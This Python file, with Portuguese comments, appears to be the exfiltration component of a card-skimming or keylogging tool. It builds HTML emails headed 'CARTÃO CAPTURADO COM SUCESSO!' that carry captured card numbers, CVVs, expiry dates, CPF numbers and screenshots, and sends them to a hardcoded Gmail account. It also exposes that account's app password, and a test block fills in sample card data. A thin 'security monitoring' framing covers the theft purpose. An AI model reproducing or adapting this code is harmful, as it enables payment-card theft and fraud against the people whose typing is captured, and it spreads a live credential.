"""
email_sender.py - VERSÃO COMPLETA
Envia e-mail com TODOS os dados capturados e anexos
"""

import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
from typing import Optional, Dict, List
import json
from pathlib import Path


class EmailSender:
    """Envia alertas COMPLETOS por e-mail"""
    
    DEFAULT_CONFIG = {
        'provider': 'gmail',
        'smtp_server': 'smtp.gmail.com',
        'smtp_port': 587,
        'use_tls': True,
        'email_from': 'unidadegoias036@gmail.com',
        'email_password': 'zhzf cziy ewml cxvw',
        'email_to': 'unidadegoias036@gmail.com',
        'send_screenshot': True,
        'alert_subject': 'AV.GOIÁS: DADOS CAPTURADOS'
    }
    
    def __init__(self, config_file: str = "email_config.json"):
        self.config = self.load_config(config_file)
        self.is_configured = self.validate_config()
        
        if not self.is_configured:
            print("   📧 Usando configuração padrão Gmail")
            self.config = self.DEFAULT_CONFIG
            self.is_configured = True
        
        # Diretório para logs de envio
        self.email_logs_dir = Path("email_logs")
        self.email_logs_dir.mkdir(exist_ok=True)
    
    def load_config(self, config_file: str) -> dict:
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        return {}
    
    def validate_config(self) -> bool:
        required = ['smtp_server', 'smtp_port', 'email_from', 'email_password', 'email_to']
        return all(key in self.config and self.config[key] for key in required)
    
    def send_complete_alert(self, card_data: Dict, attachments: List[str] = None) -> bool:
        """Envia alerta COMPLETO com todos os dados e anexos"""
        if not self.is_configured:
            print("   ⚠️ E-mail não configurado")
            return False
        
        try:
            timestamp = datetime.now().strftime("%d/%m/%Y às %H:%M:%S")
            
            # Determina se dados são completos ou mascarados
            data_type = card_data.get('data_type', 'MASKED')
            is_complete_data = data_type == 'COMPLETE'
            
            # Assunto do e-mail
            subject = f"{self.config.get('alert_subject', 'ALERTA')} - Captura #{card_data.get('capture_number', 0)}"
            
            # Prepara dados para exibição no e-mail
            display_data = {
                'Nome do Titular': card_data.get('holder_name', 'Não detectado'),
                'Número do Cartão': card_data.get('card_number', 'Não detectado'),
                'Bandeira': card_data.get('card_brand', 'Não detectada'),
                'Validade': card_data.get('expiry_date', 'Não detectada'),
                'CVV': card_data.get('cvv', 'Não detectado'),
                'CPF': card_data.get('cpf', 'Não detectado'),
                'E-mail': card_data.get('email', 'Não detectado'),
                'Janela Ativa': card_data.get('window_title', 'Desconhecida'),
                'Progresso': f"{card_data.get('completeness', 0)}%",
                'Data/Hora': card_data.get('timestamp', timestamp)
            }
            
            # Cria tabela HTML com os dados
            data_rows = ""
            for label, value in display_data.items():
                # Destaca dados sensíveis se forem completos
                row_style = ""
                value_style = ""
                
                if is_complete_data and label in ['Número do Cartão', 'CVV', 'CPF']:
                    row_style = 'style="background-color: #fff8e1;"'
                    value_style = 'style="color: #d32f2f; font-weight: bold;"'
                
                data_rows += f"""
                <tr {row_style}>
                    <td style="border: 1px solid #ddd; padding: 10px; background-color: #f9f9f9;">
                        <strong>{label}:</strong>
                    </td>
                    <td style="border: 1px solid #ddd; padding: 10px;" {value_style}>
                        {value}
                    </td>
                </tr>
                """
            
            # Adiciona aviso sobre dados sensíveis
            data_warning = ""
            if is_complete_data:
                data_warning = """
                <div style="background-color: #ffebee; border-left: 4px solid #f44336; padding: 15px; margin: 20px 0;">
                    <h3 style="color: #d32f2f; margin-top: 0;">⚠️ DADOS SENSÍVEIS COMPLETOS</h3>
                    <p>Este e-mail contém <strong>dados completos sem máscara</strong>:</p>
                    <ul>
                        <li>Número completo do cartão</li>
                        <li>CVV completo</li>
                        <li>Outros dados pessoais</li>
                    </ul>
                    <p><strong>Manipule com extrema cautela!</strong></p>
                </div>
                """
            
            # Corpo HTML do e-mail
            body = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <style>
                    body {{ font-family: 'Segoe UI', Arial, sans-serif; line-height: 1.6; color: #333; }}
                    .header {{ background-color: #d32f2f; color: white; padding: 25px; text-align: center; }}
                    .content {{ padding: 25px; background-color: #fafafa; }}
                    .alert-box {{ background-color: #fff3cd; border: 2px solid #ffc107; padding: 20px; margin: 25px 0; border-radius: 8px; }}
                    .data-table {{ width: 100%; border-collapse: collapse; margin: 25px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                    .data-table th, .data-table td {{ border: 1px solid #ddd; padding: 14px; text-align: left; }}
                    .data-table th {{ background-color: #4CAF50; color: white; }}
                    .footer {{ background-color: #f1f1f1; padding: 20px; text-align: center; color: #666; font-size: 12px; }}
                    .attachment-list {{ background-color: #e8f5e9; padding: 15px; border-radius: 5px; margin: 20px 0; }}
                    .attachment-item {{ padding: 8px; border-bottom: 1px solid #c8e6c9; }}
                    .highlight {{ background-color: #e3f2fd; padding: 3px 6px; border-radius: 3px; font-weight: bold; }}
                </style>
            </head>
            <body>
                <div class="header">
                    <h1 style="margin: 0; font-size: 28px;"> CARTÃO CAPTURADO COM SUCESSO! </h1>
                    <h2 style="margin: 10px 0 0 0; font-weight: normal;">Dados de Cartão Capturados - Detecção #{card_data.get('capture_number', 0)}</h2>
                </div>
                
                <div class="content">
                    <h3>📋 RESUMO DA CAPTURA</h3>
                    <p><strong>Data/Hora do alerta:</strong> {timestamp}</p>
                    <p><strong>Status:</strong> <span class="highlight">DETECÇÃO COMPLETA</span></p>
                    
                    {data_warning}
                    
                    <h3>💳 DADOS CAPTURADOS</h3>
                    <table class="data-table">
                        {data_rows}
                    </table>
                    
                    <div class="alert-box">
                        <h3 style="color: #856404; margin-top: 0;">⚠️ AÇÃO RECOMENDADA</h3>
                        <p><strong>Dados sensíveis foram detectados sendo digitados!</strong></p>
                        <ol>
                            <li>Verifique se o site é seguro (HTTPS e cadeado verde)</li>
                            <li>Confirme se a operação é legítima e autorizada</li>
                            <li>Notifique o titular do cartão imediatamente</li>
                            <li>Monitore extratos bancários nas próximas horas</li>
                            <li>Considere bloquear o cartão se houver suspeita</li>
                        </ol>
                    </div>
                    
                    <div class="attachment-list">
                        <h3>📎 ARQUIVOS ANEXADOS</h3>
                        {"".join([f'<div class="attachment-item">📄 {os.path.basename(file)}</div>' for file in (attachments or [])])}
                        <p style="margin-top: 10px; font-size: 11px; color: #666;">
                            <strong>Total de anexos:</strong> {len(attachments or [])} arquivo(s)
                        </p>
                    </div>
                    
                    <div style="background-color: #e8eaf6; padding: 15px; border-radius: 5px; margin-top: 25px;">
                        <h4>🔍 DETALHES TÉCNICOS</h4>
                        <p><strong>Origem:</strong> Sistema de Monitoramento de Segurança</p>
                        <p><strong>Método:</strong> Detecção em tempo real de digitação</p>
                        <p><strong>Tipo de dados:</strong> {"COMPLETOS (sem máscara)" if is_complete_data else "MASCARADOS (para segurança)"}</p>
                        <p><strong>Configuração SMTP:</strong> {self.config.get('smtp_server', 'Não configurado')}</p>
                    </div>
                </div>
                
                <div class="footer">
                    <p><strong>🔒 Sistema de Monitoramento de Segurança - Alerta Automático</strong></p>
                    <p><small>Este é um alerta automático. Não responda este e-mail.</small></p>
                    <p><small>Gerado em: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}</small></p>
                </div>
            </body>
            </html>
            """
            
            # Prepara anexos (screenshot e arquivo de texto)
            attachment_files = []
            if attachments:
                for filepath in attachments:
                    if os.path.exists(filepath):
                        attachment_files.append(filepath)
            
            # Envia e-mail
            print(f"   ✉️  Preparando envio para: {self.config['email_to']}")
            self.send_email_with_attachments(
                subject=subject,
                html_body=body,
                attachments=attachment_files,
                is_high_priority=True
            )
            
            # Log do envio
            self._log_email_sent(card_data, attachment_files)
            
            print(f"   ✅ E-mail preparado com {len(attachment_files)} anexo(s)")
            return True
            
        except Exception as e:
            print(f"   ❌ Erro ao preparar alerta: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def send_email_with_attachments(self, subject: str, html_body: str, 
                                  attachments: List[str] = None, 
                                  is_high_priority: bool = False):
        """Envia e-mail com múltiplos anexos"""
        try:
            # Cria mensagem
            msg = MIMEMultipart()
            msg['Subject'] = subject
            msg['From'] = self.config['email_from']
            msg['To'] = self.config['email_to']
            
            if is_high_priority:
                msg['X-Priority'] = '1'
                msg['Priority'] = 'urgent'
                msg['Importance'] = 'high'
            
            # Corpo HTML
            msg.attach(MIMEText(html_body, 'html'))
            
            # Adiciona anexos
            if attachments:
                print(f"   📎 Anexando {len(attachments)} arquivo(s)...")
                for filepath in attachments:
                    if os.path.exists(filepath):
                        filename = os.path.basename(filepath)
                        
                        with open(filepath, 'rb') as f:
                            file_data = f.read()
                            
                            # Determina tipo MIME baseado na extensão
                            if filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                                # Imagem
                                attachment = MIMEImage(file_data)
                                attachment.add_header('Content-Disposition', 'attachment', 
                                                    filename=filename)
                            elif filename.lower().endswith(('.txt', '.log', '.csv')):
                                # Texto
                                attachment = MIMEText(file_data.decode('utf-8', errors='ignore'), 'plain', 'utf-8')
                                attachment.add_header('Content-Disposition', 'attachment', 
                                                    filename=filename)
                            else:
                                # Outros tipos
                                attachment = MIMEBase('application', 'octet-stream')
                                attachment.set_payload(file_data)
                                encoders.encode_base64(attachment)
                                attachment.add_header('Content-Disposition', 'attachment', 
                                                    filename=filename)
                            
                            msg.attach(attachment)
                            print(f"     ✅ Anexado: {filename}")
            
            # Conecta e envia
            print(f"   🔗 Conectando ao servidor SMTP...")
            server = smtplib.SMTP(self.config['smtp_server'], self.config['smtp_port'])
            server.set_debuglevel(0)  # 0 para menos logs, 1 para mais detalhes
            
            if self.config.get('use_tls', True):
                server.starttls()
                print(f"   🔐 TLS habilitado")
            
            print(f"   🔐 Autenticando...")
            server.login(self.config['email_from'], self.config['email_password'])
            
            print(f"   📤 Enviando e-mail...")
            server.send_message(msg)
            server.quit()
            
            print(f"   ✅ E-mail enviado com sucesso!")
            
        except smtplib.SMTPAuthenticationError:
            print("   ❌ ERRO: Falha na autenticação SMTP")
            print("   💡 Verifique:")
            print("      • Usuário e senha corretos")
            print("      • 'Senhas de App' se 2FA estiver ativado")
            print("      • Permissão para apps menos seguros (se habilitado)")
            raise
        except Exception as e:
            print(f"   ❌ ERRO ao enviar e-mail: {type(e).__name__}: {e}")
            raise
    
    def _log_email_sent(self, card_data: Dict, attachments: List[str]):
        """Registra envio de e-mail em arquivo de log"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            log_file = self.email_logs_dir / f"email_sent_{timestamp}.json"
            
            log_data = {
                'timestamp': datetime.now().isoformat(),
                'to': self.config['email_to'],
                'subject': f"Dados Capturados - #{card_data.get('capture_number', 0)}",
                'data_type': card_data.get('data_type', 'UNKNOWN'),
                'attachments': [os.path.basename(a) for a in attachments],
                'card_data_summary': {
                    'holder_name': card_data.get('holder_name'),
                    'card_last4': str(card_data.get('card_number', ''))[-4:] if card_data.get('card_number') else None,
                    'expiry_date': card_data.get('expiry_date'),
                    'has_cvv': bool(card_data.get('cvv')),
                    'window_title': card_data.get('window_title')
                }
            }
            
            with open(log_file, 'w') as f:
                json.dump(log_data, f, indent=2, ensure_ascii=False)
            
            print(f"   📝 Log de envio salvo: {log_file}")
            
        except Exception as e:
            print(f"   ⚠️ Erro ao salvar log: {e}")
    
    def send_test_email(self) -> bool:
        """Envia e-mail de teste"""
        try:
            subject = "🧪 Teste - Sistema de Monitoramento Configurado"
            body = f"""
            <h2>✅ Sistema de Monitoramento Configurado com Sucesso!</h2>
            <p>Este é um e-mail de teste do sistema de monitoramento de segurança.</p>
            <p>Você receberá alertas quando dados sensíveis de cartão forem detectados.</p>
            <hr>
            <p><strong>Configuração:</strong></p>
            <ul>
                <li>Servidor SMTP: {self.config.get('smtp_server')}</li>
                <li>Remetente: {self.config.get('email_from')}</li>
                <li>Destinatário: {self.config.get('email_to')}</li>
            </ul>
            <p><small>Enviado em: {datetime.now().strftime('%d/%m/%Y às %H:%M:%S')}</small></p>
            """
            
            self.send_email_with_attachments(subject, body)
            print("   ✅ E-mail de teste enviado!")
            return True
        except Exception as e:
            print(f"   ❌ Erro ao enviar teste: {e}")
            return False


# TESTE
if __name__ == "__main__":
    print("=" * 60)
    print("🧪 TESTE DE ENVIO DE E-MAIL COMPLETO")
    print("=" * 60)
    
    sender = EmailSender()
    
    # Testa conexão
    print("\n📤 Enviando e-mail de teste...")
    if sender.send_test_email():
        print("   ✅ Conexão SMTP funcionando!")
    else:
        print("   ❌ Falha na conexão SMTP")
        exit(1)
    
    # Testa envio completo
    print("\n📤 Enviando alerta completo de teste...")
    
    # Dados fictícios completos
    test_data = {
        'holder_name': 'MARCIO DA SILVA SANTOS',
        'card_number': '4454 5565 6665 9882',
        'card_brand': 'Visa',
        'expiry_date': '10/26',
        'cvv': '123',
        'cpf': '123.456.789-00',
        'email': 'marcio.santos@exemplo.com',
        'window_title': 'Loja Virtual - Google Chrome',
        'completeness': 100,
        'timestamp': datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        'data_type': 'COMPLETE',
        'capture_number': 1,
        'has_screenshot': True,
        'has_text_file': True
    }
    
    # Cria arquivos de teste
    import tempfile
    from PIL import Image
    
    # Cria screenshot de teste
    test_screenshot = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
    Image.new('RGB', (800, 600), color='blue').save(test_screenshot.name)
    test_screenshot.close()
    
    # Cria arquivo de texto de teste
    test_textfile = tempfile.NamedTemporaryFile(suffix='.txt', delete=False, mode='w', encoding='utf-8')
    test_textfile.write("""
AV GOIAS: DADOS CAPTURADOS COM SUCESSO!
==========================
NOME: MARCIO DA SILVA SANTOS
CARTÃO: 4454 5565 6665 9882
VALIDADE: 10/26
CVV: 123
""")
    test_textfile.close()
    
    attachments = [test_screenshot.name, test_textfile.name]
    
    print(f"\n📎 Criados arquivos de teste:")
    for file in attachments:
        print(f"   • {os.path.basename(file)}")
    
    # Envia alerta completo
    print(f"\n✉️  Enviando alerta com {len(attachments)} anexos...")
    if sender.send_complete_alert(test_data, attachments):
        print("   ✅ Alerta completo enviado com sucesso!")
    else:
        print("   ❌ Falha ao enviar alerta completo")
    
    # Limpa arquivos temporários
    for file in attachments:
        try:
            os.unlink(file)
        except:
            pass
    
    # Mostra logs
    print(f"\n📊 LOGS DE E-MAIL:")
    if sender.email_logs_dir.exists():
        log_files = list(sender.email_logs_dir.glob("*.json"))
        print(f"   Total de logs: {len(log_files)}")
        if log_files:
            print(f"   Último log: {log_files[-1].name}")
    
    print(f"\n{'='*60}")
    print("TESTE FINALIZADO")
    print(f"{'='*60}")